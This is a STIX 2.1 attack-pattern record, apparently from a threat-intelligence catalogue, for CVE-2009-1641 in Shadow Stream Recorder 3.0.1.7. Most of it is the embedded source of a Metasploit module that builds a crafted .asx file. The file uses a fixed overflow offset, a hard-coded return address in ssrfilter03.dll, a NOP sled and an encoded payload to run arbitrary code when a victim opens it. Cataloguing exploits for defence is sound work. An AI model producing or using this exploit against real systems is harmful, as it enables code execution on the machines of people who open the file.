{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6de1f220-2eef-4194-93e7-7e823c536c98",
    "created": "2024-08-14T16:36:01.689619Z",
    "modified": "2024-08-14T16:36:01.689623Z",
    "name": "Shadow Stream Recorder 3.0.1.7 Buffer Overflow",
    "description": " This module exploits a buffer overflow in Shadow Stream Recorder 3.0.1.7. Using the application to open a specially crafted asx file, a buffer overflow may occur to allow arbitrary code execution under the context of the user.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/shadow_stream_recorder_bof.rb",
            "external_id": "shadow_stream_recorder_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1641"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Shadow Stream Recorder 3.0.1.7 Buffer Overflow',\n      'Description'     => %q{\n        This module exploits a buffer overflow in Shadow Stream Recorder 3.0.1.7.\n        Using the application to open a specially crafted asx file, a buffer\n        overflow may occur to allow arbitrary code execution under the context\n        of the user.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'AlpHaNiX <alpha[at]hacker.bz>',  # Original .m3u exploit\n          'b0telh0 <me[at]gotgeek.com.br>'  # MSF Module and .asx exploit\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2009-1641' ],\n          [ 'OSVDB', '81487' ],\n          [ 'EDB', '11957' ],\n          [ 'BID', '34864' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Platform'        => 'win',\n      'Payload'         =>\n        {\n          'Space' => 2000,\n          'BadChars' => \"\\x00\\x09\\x0a\",\n          'StackAdjustment' => -3500\n        },\n      'Targets'         =>\n        [\n          [ 'Windows Universal',\n            {\n              # push esp - ret ssrfilter03.dll\n              'Ret' => 0x10035706,\n              'Offset' => 26117\n            }\n          ],\n        ],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2010-03-29',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'The file name.', 'msf.asx'])\n      ])\n\n  end\n\n  def exploit\n\n    buffer = \"http://\"\n    buffer << rand_text_alpha_upper(target['Offset'])\n    buffer << [target.ret].pack('V')\n    buffer << make_nops(40)\n    buffer << payload.encoded\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(buffer)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-29",
    "x_mitre_platforms": [
        "win'"
    ]
}